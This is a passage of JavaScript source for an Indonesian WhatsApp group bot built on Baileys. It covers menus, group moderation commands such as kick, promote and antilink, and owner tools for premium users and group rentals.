    GIFBufferToVideoBuffer,
    totalcase }
// Kode ini ngeliat plugin satu per satu, kalo nemu plugin yang cocok ama command yang diterima, dia langsung manggil fungsi operate-nya dan berhenti.
let handled = false
for (const plugin of plugins) {
    if (plugin.command.includes(command)) {
        try {
            await plugin.operate(context)
            handled = true
        } catch (error) {
            console.error(`Error executing plugin ${plugin.filePath}:`, error)
        }
        break
    }
}      
//=================================================//
switch(command) {
//=================================================//
case 'menu':
    const menugambir = pickRandom([
        "https://h.top4top.io/p_31922c8vs1.jpg",
        "https://i.top4top.io/p_3192h4d0u1.jpg",
        "https://a.top4top.io/p_31931ct4b1.jpg",
        "https://d.top4top.io/p_3193ra05b1.jpg",
        "https://f.top4top.io/p_319390vyq1.jpg",
    ]);

    let menulist = `┌  ◦ *LIST MENU*
│  ◦ ${prefix}menu all
│  ◦ ${prefix}menu ai
│  ◦ ${prefix}menu anime
│  ◦ ${prefix}menu asupan
│  ◦ ${prefix}menu group 
│  ◦ ${prefix}menu download
│  ◦ ${prefix}menu database
│  ◦ ${prefix}menu convert 
│  ◦ ${prefix}menu internet
│  ◦ ${prefix}menu maker
│  ◦ ${prefix}menu primbon
│  ◦ ${prefix}menu fun
│  ◦ ${prefix}menu rpg
│  ◦ ${prefix}menu tools
│  ◦ ${prefix}menu sticker
│  ◦ ${prefix}menu search
│  ◦ ${prefix}menu owner
│  ◦ ${prefix}menu panel
│  ◦ ${prefix}menu quotes
└  ◦ ${prefix}menu nsfw
`;

    let teksmenu = `Hi @${m.sender.split('@')[0]}ᬊ,
I am an automated system (WhatsApp Bot) that can help with various things such as doing tasks with AI, and downloading videos from the TikTok, IG, or YouTube platforms.

\`\`\`「 DASBOARD 」\`\`\`
 ◦  *Library:* adiwajshing/Baileys
 ◦  *Version:* *\`1.0.0\`*
 ◦  *Platform:* ${os.platform()}
 ◦  *Total Fitur:* ${totalFitur()}

\`\`\`「 USER INFO 」\`\`\` 
 ◦ Name : ${pushname}
 ◦ Number : ${m.sender.split('@')[0]}
 ◦ Access : ${isCreator ? 'Owner' : isPremium ? 'Premium' : 'Gratisan✨'}
 ◦ Saldo : Rp. 0
 ◦ Limit :  ∞
 ◦ Tanggal : ${lilydate}`;

    let lilyMenu = `${teksmenu}${readmore}\n\n${menulist}`;

    try {
        if (args[0] == 'nsfw') {
            lilychanjReply(`${nsfwmenu(prefix)}`);
        } else if (args[0] == 'tools') {
            lilychanjReply(`${toolsmenu(prefix)}`);
        } else if (args[0] == 'ai') {
            lilychanjReply(`${aimenu(prefix)}`);
        } else if (args[0] == 'asupan') {
            lilychanjReply(`${asupanmenu(prefix)}`);
        } else if (args[0] == 'anime') {
            lilychanjReply(`${animemenu(prefix)}`);
        } else if (args[0] == 'owner') {
            lilychanjReply(`${ownermenu(prefix)}`);
        } else if (args[0] == 'internet') {
            lilychanjReply(`${internetmenu(prefix)}`);
        } else if (args[0] == 'convert') {
            lilychanjReply(`${convertmenu(prefix)}`);
        } else if (args[0] == 'download') {
            lilychanjReply(`${downloadmenu(prefix)}`);
        } else if (args[0] == 'primbon') {
            lilychanjReply(`${primbonmenu(prefix)}`);
        } else if (args[0] == 'group') {
            lilychanjReply(`${groupmenu(prefix)}`);
        } else if (args[0] == 'panel') {
            lilychanjReply(`${menupanel}`);
        } else if (args[0] == 'maker') {
            lilychanjReply(`${makermenu(prefix)}`);
        } else if (args[0] == 'database') {    
            lilychanjReply(`${databasemenu(prefix)}`);
        } else if (args[0] == 'search') {
            lilychanjReply(`${searchmenu(prefix)}`);    
        } else if (args[0] == 'sticker') {
            lilychanjReply(`${stickermenu(prefix)}`);
        } else if (args[0] == 'rpg') { 
            lilychanjReply (`belom ada`);
        } else if (args[0] == 'fun') {
            lilychanjReply(`${funmenu(prefix)}`);
        } else if (args[0] == 'quotes') {
            lilychanjReply(`${quotesmenu(prefix)}`);    
        } else if (args[0] == 'all') {
            lilychan.sendMessage(m.chat, {
                text: `${teksmenu}\n\n${allmenu(prefix)}`,
                contextInfo: { 
                    mentionedJid: [m.sender, "0@s.whatsapp.net"], 
                    externalAdReply: {
                        showAdAttribution: true,
                        title: `Lilychanj - Wabot`,
                        body: '',
                        thumbnailUrl: menugambir,
                        sourceUrl: "https://Instagram.com/senzhndra",
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            }, { 
                quoted : m
            });
        } else await lilychan.sendMessage(m.chat, {
            document: fs.readFileSync('./AllMedia/image/thumb.jpg'),
            fileName: salam,
            mimetype: "image/png",
            fileLength: 99999999999,
            jpegThumbnail: fkethmb,
            description: salam,
            caption: Styles(lilyMenu),
            contextInfo: {
                isForwarded: true,
                mentionedJid: [m.sender],
                businessMessageForwardInfo: {
                    businessOwnerJid: `6281541177589@s.whatsapp.net`
                },
                forwardedNewsletterMessageInfo: {
                    newsletterName: `( ❄️ ) T4N4K4 | WHATSAPP SYSTEM`,
                    newsletterJid: global.idch
                },
                externalAdReply: {
                    title: `𝕷𝖎𝖑𝖞𝖈𝖍𝖆𝖓𝖏 - 𝖂𝖍𝖆𝖙𝖘𝕬𝖕𝖕 𝕭𝖔𝖙`,
                    body: `Uptime ${runtime(process.uptime())}`,
                    thumbnailUrl: "https://d.top4top.io/p_3206j91fx1.jpg",
                    sourceUrl: null,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: ftroli });
    } catch (e) {
        console.log(e);
        m.reply('`note:` Maaf fitur yang anda maksut sedang dalam pengerjaan ☺');
    }
    break;
//<================================================>//
/*
 
 
                    [ SCRIPT LILY ]
    I share this script for free without spending any money, and I forbid anyone from selling this script. please report to Tanaka Senn if anyone is caught selling script Lilychanj 
                   < GROUP FITUR >

*/
//<================================================>//
case "disk": {
    exec('cd && du -h --max-depth=1', (err, stdout) => {
        if (err) return m.reply(`${err}`);
        if (stdout) return m.reply(stdout);
    });
}
break;

case 'infogroup':
case 'infogc': {
    if (!m.isGroup) return m.reply('Khusus Di Group Pantekkk!');
    let meta = await lilychan.groupMetadata(m.chat);
    let admin = meta.participants.filter(p => p.admin);
    let listAdmin = admin.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n');
    
    let pelertanaka = `🍁 *G R O U P - I N F O* 🍁\n
◦  *Name* : ${meta.subject}
◦  *ID* : ${meta.id}
◦  *Owner* : ${meta.owner ? '@' + meta.owner.split('@')[0] : m.chat.match('-') ? '@' + m.chat.split('-')[0] : ''}
◦  *Created* : ${moment(meta.creation * 1000).format('DD/MM/YY HH:mm:ss')}
◦  *Member* : ${meta.participants.length}
◦  *AntilinkGc* : ${antilinkngawi ? '[ ON ]' : '[ OFF ]'}
◦  *AntiStone* : ${Antibatu ? '[ ON ]' : '[ OFF ]'}
◦  *AntiSticker* : ${Antisticker ? '[ ON ]' : '[ OFF ]'}`.trim();

    lilychan.sendMessage(m.chat, { 
        text: pelertanaka, 
        contextInfo: { 
            mentionedJid: [sender],
            forwardingScore: 999,
        }
    }, { quoted: m });
}
break;

case 'antilinkgc': {
    if (!m.isGroup) return m.reply('gc doang.');
    if (!isBotAdmins) return m.reply('adminin botnya.');

    if (args[0] === "on") {
        if (antilinkngawi) return m.reply('Already activated');
        ntlinkgc.push(from);
        fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc));
        m.reply('Success in turning on antiwame in this group');

        var groupe = await lilychan.groupMetadata(from);
        var members = groupe['participants'];
        var mems = [];

        members.map(async adm => {
            mems.push(adm.id.replace('c.us', 's.whatsapp.net'));
        });

        lilychan.sendMessage(from, {
            text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`,
            contextInfo: { mentionedJid: mems }
        }, { quoted: m });
    } else if (args[0] === "off") {
        if (!antilinkngawi) return m.reply('Already deactivated');
        let off = ntlinkgc.indexOf(from);
        ntlinkgc.splice(off, 1);
        fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc));
        m.reply('Success in turning off antiwame in this group');
    } else {
        await m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`);
    }
}
break;

case 'antistone': {
    if (!m.isGroup) return m.reply('gc doang.');
    if (!isBotAdmins) return m.reply('adminin botnya.');

    if (args[0] === "on") {
        if (Antibatu) return m.reply('Already activated');
        ntstone.push(from);
        fs.writeFileSync('./database/antibatu.json', JSON.stringify(ntstone));
        m.reply('Success in turning on antistone in this group');

        var groupe = await lilychan.groupMetadata(from);
        var members = groupe['participants'];
        var mems = [];

        members.map(async adm => {
            mems.push(adm.id.replace('c.us', 's.whatsapp.net'));
        });

        lilychan.sendMessage(from, {
            text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo one is allowed to send rock emojis in this group. Anyone who does will be immediately removed!`,
            contextInfo: { mentionedJid: mems }
        }, { quoted: m });
    } else if (args[0] === "off") {
        if (!Antibatu) return m.reply('Already deactivated');
        let off = ntstone.indexOf(from);
        ntstone.splice(off, 1);
        fs.writeFileSync('./database/antibatu.json', JSON.stringify(ntstone));
        m.reply('Success in turning off antistone in this group');
    } else {
        await m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`);
    }
}
break;

case 'antisticker': {
    if (!m.isGroup) return m.reply('gc doang.');
    if (!isBotAdmins) return m.reply('adminin botnya.');

    if (args[0] === "on") {
        if (Antisticker) return m.reply('Already activated');
        ntsticker.push(from);
        fs.writeFileSync('./database/antisticker.json', JSON.stringify(ntsticker));
        m.reply('Success in turning on antistone in this group');

        var groupe = await lilychan.groupMetadata(from);
        var members = groupe['participants'];
        var mems = [];

        members.map(async adm => {
            mems.push(adm.id.replace('c.us', 's.whatsapp.net'));
        });

        lilychan.sendMessage(from, {
            text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo one is allowed to send sticker messages in this group. Anyone who does so will be immediately removed!`,
            contextInfo: { mentionedJid: mems }
        }, { quoted: m });
    } else if (args[0] === "off") {
        if (!Antisticker) return m.reply('Already deactivated');
        let off = ntsticker.indexOf(from);
        ntsticker.splice(off, 1);
        fs.writeFileSync('./database/antisticker.json', JSON.stringify(ntsticker));
        m.reply('Success in turning off antistone in this group');
    } else {
        await m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`);
    }
}
break;
case 'closetime': {
    if (!m.isGroup) return m.reply(mess.group);
    if (!isAdmins && !isCreator) return m.reply(mess.admin);
    if (!isBotAdmins) return m.reply(mess.botAdmin);

    let timer;
    if (args[1] == 'second') {
        timer = args[0] * 1000;
    } else if (args[1] == 'minute') {
        timer = args[0] * 60000;
    } else if (args[1] == 'hour') {
        timer = args[0] * 3600000;
    } else if (args[1] == 'day') {
        timer = args[0] * 86400000;
    } else {
        return m.reply('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second');
    }

    m.reply(`Close time ${q} starting from now`);
    setTimeout(() => {
        var nomor = m.participant;
        const close = `*Closed* group closed by admin\nnow only admin can send messages`;
        lilychan.groupSettingUpdate(m.chat, 'announcement');
        m.reply(close);
    }, timer);
}
break;

case 'opentime': {
    if (!m.isGroup) return m.reply(mess.group);
    if (!isAdmins && !isCreator) return m.reply(mess.admin);
    if (!isBotAdmins) return m.reply(mess.botAdmin);

    let timer;
    if (args[1] == 'second') {
        timer = args[0] * 1000;
    } else if (args[1] == 'minute') {
        timer = args[0] * 60000;
    } else if (args[1] == 'hour') {
        timer = args[0] * 3600000;
    } else if (args[1] == 'day') {
        timer = args[0] * 86400000;
    } else {
        return m.reply('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second');
    }

    m.reply(`Open time ${q} starting from now`);
    setTimeout(() => {
        var nomor = m.participant;
        const open = `*Opened* The group is opened by admin\nNow members can send messages`;
        lilychan.groupSettingUpdate(m.chat, 'not_announcement');
        m.reply(open);
    }, timer);
}
break;
case 'kick': 
    if (!m.isGroup) return m.reply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return m.reply(mess.admin);
    if (!isBotAdmins) return m.reply(mess.botAdmin);

    let blockwww = m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : m.quoted 
            ? m.quoted.sender 
            : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    await lilychan.groupParticipantsUpdate(m.chat, [blockwww], 'remove')
        .then((res) => m.reply('*`Succes`* Kick Number✅'))
        .catch((err) => m.reply(json(err)));
    break;


case 'add': 
    if (!m.isGroup) return m.reply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return m.reply(mess.admin);
    if (!isBotAdmins) return m.reply(mess.botAdmin);

    let blockwwww = m.quoted 
        ? m.quoted.sender 
        : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    await lilychan.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
        .then((res) => m.reply(json(res)))
        .catch((err) => m.reply(json(err)));
    break;


case 'promote': 
    if (!m.isGroup) return m.reply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return m.reply(mess.admin);
    if (!isBotAdmins) return m.reply(mess.botAdmin);

    let blockwwwww = m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : m.quoted 
            ? m.quoted.sender 
            : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    await lilychan.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
        .then((res) => m.reply(json(res)))
        .catch((err) => m.reply(json(err)));
    break;


case 'demote': 
    if (!m.isGroup) return m.reply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return m.reply(mess.admin);
    if (!isBotAdmins) return m.reply(mess.botAdmin);

    let blockwwwwwa = m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : m.quoted 
            ? m.quoted.sender 
            : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    await lilychan.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
        .then((res) => m.reply(json(res)))
        .catch((err) => m.reply(json(err)));
    break;


case 'setname':
case 'setnamegc': 
    if (!m.isGroup) return m.reply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return m.reply(mess.admin);
    if (!isBotAdmins) return m.reply(mess.botAdmin);
    if (!text) return m.reply('```🚩Enter New Group Name```');

    await lilychan.groupUpdateSubject(m.chat, text)
        .then((res) => m.reply(mess.done))
        .catch((err) => m.reply(json(err)));
    break;


case 'setdesc':
case 'setdesk': 
    if (!m.isGroup) return m.reply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return m.reply(mess.admin);
    if (!isBotAdmins) return m.reply(mess.botAdmin);
    if (!text) return m.reply('Text ?');

    await lilychan.groupUpdateDescription(m.chat, text)
        .then((res) => m.reply(mess.done))
        .catch((err) => m.reply(json(err)));
    break;

case 'setppgroup':
case 'setppgrup':
case 'setppgc': 
    if (!m.isGroup) return m.reply(mess.group);
    if (!isAdmins) return m.reply(mess.admin);
    if (!isBotAdmins) return m.reply(mess.botAdmin);
    if (!quoted) return m.reply(`Send/Reply Image With Caption ${prefix + command}`);
    if (!/image/.test(mime)) return m.reply(`Send/Reply Image With Caption ${prefix + command}`);
    if (/webp/.test(mime)) return m.reply(`Send/Reply Image With Caption ${prefix + command}`);

    var medis = await lilychan.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg');

    if (args[0] == 'full') {
        var { img } = await generateProfilePicture(medis);
        await lilychan.query({
            tag: 'iq',
            attrs: {
                to: m.chat,
                type: 'set',
                xmlns: 'w:profile:picture'
            },
            content: [{
                tag: 'picture',
                attrs: {
                    type: 'image'
                },
                content: img
            }]
        });
        fs.unlinkSync(medis);
        m.reply(mess.done);
    } else {
        var memeg = await lilychan.updateProfilePicture(m.chat, {
            url: medis
        });
        fs.unlinkSync(medis);
        m.reply(mess.done);
    }
    break;
            case 'tagall':
                if (!m.isGroup) return m.reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return m.reply(mess.admin)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                let teks = `*👥 Tag All*
 
                 🗞️ *Message : ${q ? q : 'blank'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                lilychan.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'hidetag':
            case 'h': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return m.reply(mess.admin)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                lilychan.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                }
                break
            case 'totag':
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
                if (!m.quoted) return m.reply(`Reply messages with captions ${prefix + command}`)
                lilychan.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
            case 'group':
            case 'grup':
                if (!m.isGroup) return m.reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return m.reply(mess.admin)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (args[0] === 'close') {
                    await lilychan.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Success In Closing The Group 🕊️`)).catch((err) => m.reply(json(err)))
                } else if (args[0] === 'open') {
                    await lilychan.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Success In Opening The Group 🕊️`)).catch((err) => m.reply(json(err)))
                } else {
                    m.reply(`Mode ${command}\n\n\nType ${prefix + command}open/close`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return m.reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return m.reply(mess.admin)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (args[0] === 'open') {
                    await lilychan.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Successfully Opened Group Edit Info 🕊️`)).catch((err) => m.reply(json(err)))
                } else if (args[0] === 'close') {
                    await lilychan.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Successfully Closed Group Edit Info🕊️`)).catch((err) => m.reply(json(err)))
                } else {
                    m.reply(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
                break
case 'linkgroup':
case 'grouplink':
case 'linkgrup':
case 'linkgc': {
    if (!m.isGroup) return m.reply(mess.group);
    if (!isBotAdmins) return m.reply(mess.botAdmin);

    let response = await lilychan.groupInviteCode(m.chat);
    let code = `https://chat.whatsapp.com/${response}`;
    let capt = `👥 *GROUP LINK INFO*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n👥 *Member :* ${groupMetadata.participants.length}`;

    let { proto, generateWAMessageFromContent } = require('@adiwajshing/baileys');
    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: ``
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: capt
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        subtitle: "Tanaka Sense",
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_copy",
                                "buttonParamsJson": `{\"display_text\":\"Copy Link ⸙\",\"id\":\"123456789\",\"copy_code\":\"${code}\"}`
                            },
                        ],
                    })
                })
            }
        }
    }, { quoted: m });

    await lilychan.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return m.reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return m.reply(mess.admin)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                await lilychan.groupRevokeInvite(m.chat)
                    .then(res => {
                        m.reply(`Successful Reset, Group Invite Link ${groupMetadata.subject}`)
                    }).catch((err) => m.reply(json(err)))
                break
                  case 'delete': case 'del': case 'd':{
            	 let key = {}
             try {
               	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
            	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
            	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
             	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
         } catch (e) {
 	console.error(e)
 }
 lilychan.sendMessage(m.chat, { delete: key })
}
break
case 'everyone': {
if (!isCreator) return m.reply(mess.owner)
let mem = m.isGroup ? await groupMetadata.participants.map(a => a.id) : ""
lilychan.sendMessage(m.chat, {
	text: `@${m.chat} ${text}`,
	contextInfo: {
mentionedJid: mem, 
		groupMentions: [
			{
				groupSubject: `everyone`,
				groupJid: m.chat,
			},
		],
	},
});
}
break 
case "ocr":{
let q = m.quoted ? m.quoted : m
let mime = (q.msg || q).mimetype || ''
if (!mime) return m.reply(`balas gambar dengan perintah .ocr`)
if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`_*jenis ${mime} tidak didukung!*_`)
const ocrapi = require("ocr-space-api-wrapper")
let img = await lilychan.downloadAndSaveMediaMessage(q)
let url = await uploadToUguu(img)
let hasil = await ocrapi.ocrSpace(url)
 await m.reply(hasil.ParsedResults[0].ParsedText)
}
break
//<================================================>//
/*
 
 
                    [ SCRIPT LILY ]
    I share this script for free without spending any money, and I forbid anyone from selling this script. please report to Tanaka Senn if anyone is caught selling script Lilychanj 
                   < OWNER FITUR >

*/
//<================================================>// 
case 'get': {
    if (!text) return m.reply(`awali *URL* dengan http:// atau https://`);

    try {
        const gt = await axios.get(text, {
            headers: {
                "Access-Control-Allow-Origin": "*",
                "Referer": "https://www.google.com/",
                "Referrer-Policy": "strict-origin-when-cross-origin",
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
            },
            responseType: 'arraybuffer'
        });

        const contentType = gt.headers['content-type'];
        console.log(`Content-Type: ${contentType}`);

        if (/json/i.test(contentType)) {
            const jsonData = JSON.parse(Buffer.from(gt.data, 'binary').toString('utf8'));
            return m.reply(JSON.stringify(jsonData, null, 2));
        } else if (/text/i.test(contentType)) {
            const textData = Buffer.from(gt.data, 'binary').toString('utf8');
            return m.reply(textData);
        } else if (text.includes('webp')) {
            return lilychan.sendImageAsSticker(m.chat, text, m, { packname, author });
        } else if (/image/i.test(contentType)) {
            return lilychan.sendMessage(m.chat, { image: { url: text } }, { quoted: m });
        } else if (/video/i.test(contentType)) {
            return lilychan.sendMessage(m.chat, { video: { url: text } }, { quoted: m });
        } else if (/audio/i.test(contentType) || text.includes(".mp3")) {
            return lilychan.sendMessage(m.chat, { audio: { url: text } }, { quoted: m });
        } else if (/application\/zip/i.test(contentType) || /application\/x-zip-compressed/i.test(contentType)) {
            return lilychan.sendFile(m.chat, text, '', text, m);
        } else if (/application\/pdf/i.test(contentType)) {
            return lilychan.sendFile(m.chat, text, '', text, m);
        } else {
            return m.reply(`MIME : ${contentType}\n\n${gt.data}`);
        }
    } catch (error) {
        console.error(`Terjadi kesalahan: ${error}`);
        return m.reply(`Terjadi kesalahan saat mengakses URL: ${error.message}`);
    }
}
break

case 'delsampah': {
    if (!isCreator) return m.reply(mess.owner);
    m.reply(mess.wait);

    let directoryPath = './'; // Ganti dengan path yang sesuai di dalam kontainer
    fs.readdir(directoryPath, async function (err, files) {
        if (err) {
            return m.reply('Tidak dapat memindai direktori: ' + err);
        }

        let filteredArray = files.filter(item =>
            item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") ||
            item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") ||
            item.endsWith("webp") || item.endsWith("webm") || item.endsWith("zip") ||
            item.endsWith("tar.gz")
        );

        let teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`;
        if (filteredArray.length === 0) return m.reply(teks);

        for (let i = 0; i < filteredArray.length; i++) {
            console.log("Nama file:", filteredArray[i]); // Tambahkan log untuk memeriksa nama file
            let stats = fs.statSync(path.join(directoryPath, filteredArray[i]));
            console.log("Stats:", stats); // Tambahkan log untuk memeriksa informasi stats

            let fileSizeInBytes = stats.size;
            let fileSize;

            if (fileSizeInBytes < 1024) {
                fileSize = `${fileSizeInBytes} Bytes`;
            } else if (fileSizeInBytes < 1024 * 1024) {
                fileSize = `${(fileSizeInBytes / 1024).toFixed(2)} KB`;
            } else if (fileSizeInBytes < 1024 * 1024 * 1024) {
                fileSize = `${(fileSizeInBytes / (1024 * 1024)).toFixed(2)} MB`;
            } else {
                fileSize = `${(fileSizeInBytes / (1024 * 1024 * 1024)).toFixed(2)} GB`;
            }

            teks += `${i + 1}. ${filteredArray[i]} - ${fileSize}\n`;
        }

        m.reply(teks);
        await sleep(2000);
        m.reply("Menghapus file sampah...");

        await Promise.all(filteredArray.map(async function (file) {
            try {
                await fs.unlinkSync(path.join(directoryPath, file));
            } catch (err) {
                console.error(err);
            }
        }));

        await sleep(2000);
        m.reply("Berhasil menghapus semua sampah");
    });
}
break    
case 'join': {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply('Masukkan Link Group!');
    if (!args[0] || !args[0].includes('whatsapp.com')) return m.reply('Link Invalid!');

    const result = args[0].split('https://chat.whatsapp.com/')[1];
    m.reply(mess.wait);

    await lilychan.groupAcceptInvite(result).catch((respon) => {
        if (respon.data == 400) return m.reply('Grup Tidak Di Temukan❗');
        if (respon.data == 401) return m.reply('Bot Di Kick Dari Grup Tersebut❗');
        if (respon.data == 409) return m.reply('Bot Sudah Join Di Grup Tersebut❗');
        if (respon.data == 410) return m.reply('Url Grup Telah Di Setel Ulang❗');
        if (respon.data == 500) return m.reply('Grup Penuh❗');
    });
}
break

case 'cekapi': {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply('Masukan Apikey Mu');

    m.reply('Sebentar(⁠≧⁠▽⁠≦⁠)');
    try {
        let api = await fetch(`https://api.betabotz.eu.org/api/checkkey?apikey=${text}`);
        let body = await api.text();
        m.reply(body);
    } catch (e) {
        console.log(e);
        m.reply('Apikey tidak terdaftar!');
    }
}
break

case 'addprem': {
    if (!isCreator) return m.reply(mess.owner);
    let jawir = args[0] + "@s.whatsapp.net";

    if (args.length < 2) {
        return m.reply(`Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d`);
    }

    if (m.mentionedJid.length !== 0) {
        for (let i = 0; i < m.mentionedJid.length; i++) {
            addPremiumUser (m.mentionedJid[i], args[1], premium);
        }
        m.reply("Premium Success");
    } else {
        addPremiumUser (args[0] + "@s.whatsapp.net", args[1], premium);
        lilychan.sendMessage(jawir, { text: 'Congratulations you are now premium in Lilychan database 🎊' }, { quoted: m });
        m.reply("Success");
    }
}
break

case 'delprem': {
    if (!isCreator) return m.reply(mess.owner);
    if (args.length < 1) return m.reply(`Use :\n*#delprem* @tag\n*#delprem* number`);

    if (m.mentionedJid.length !== 0) {
        for (let i = 0; i < m.mentionedJid.length; i++) {
            premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
            fs.writeFileSync("./system/database/premium.json", JSON.stringify(premium));
        }
        m.reply("Delete success");
    } else {
        premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
        fs.writeFileSync("./system/database/premium.json", JSON.stringify(premium));
        m.reply("Success");
    }
}
break

case 'listprem': {
    if (!isCreator) return m.reply(mess.owner);
    let data = require("./system/database/premium.json");
    let txt = `*------「 LIST PREMIUM 」------*\n\n`;

    for (let i of data) {
        txt += `Number : ${i.id}\n`;
        txt += `Expired : ${i.expired} Second\n`;
    }

    lilychan.sendMessage(m.chat, {
        text: txt,
        mentions: data
    }, {
        quoted: m
    });
}
break
case 'listsewa': {
    let list_sewa_list = `*LIST SEWA GROUP*\n\n*Total:* ${sewa.length}\n\n`;
    
    for (let x of sewa) {
        list_sewa_list += `*ID :* ${x.id}\n`;
        
        if (x.expired === 'PERMANENT') {
            list_sewa_list += `*Expire :* PERMANENT\n\n`;
        } else {
            let ceksewa = ms(x.expired - Date.now());
            list_sewa_list += `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s) ${ceksewa.seconds} second(s)\n\n`;
        }
    }

    lilychan.sendMessage(m.chat, { text: list_sewa_list }, { quoted: m });
}
break

case 'checksewa':
case 'ceksewa': {
    if (!m.isGroup) return reply('Only group');
    if (!isCreator) return m.reply('Only owner');

    let sewanya = `*Status:* ${sewa.status}\n*ID:* ${sewa.id}\n*Expire :* ${sewa.expired}`;
    m.reply(sewanya);
}
break

case 'addsewa': {
    if (!isCreator) return m.reply('Only owner');
    if (args.length < 2) return m.reply(`Gunakan dengan cara ${command} *link waktu*\n\nContoh : ${command} https://chat.whatsapp.com/Hjv5qt195A2AcwkbswwoMQ 30d`);
    if (!args[0]) return m.reply('Harus berupa link');

    let url = args[0].split('https://chat.whatsapp.com/')[1];
    if (!args[1]) return m.reply(`Waktunya?`);

    var data = await lilychan.groupAcceptInvite(url);
    if (_sewa.checkSewaGroup(data, sewa)) return m.reply(`Bot sudah disewa oleh grup tersebut!`);

    _sewa.addSewaGroup(data, args[1], sewa);
    m.reply(`Success Add Sewa Group!`);
}
break

case 'delsewa': {
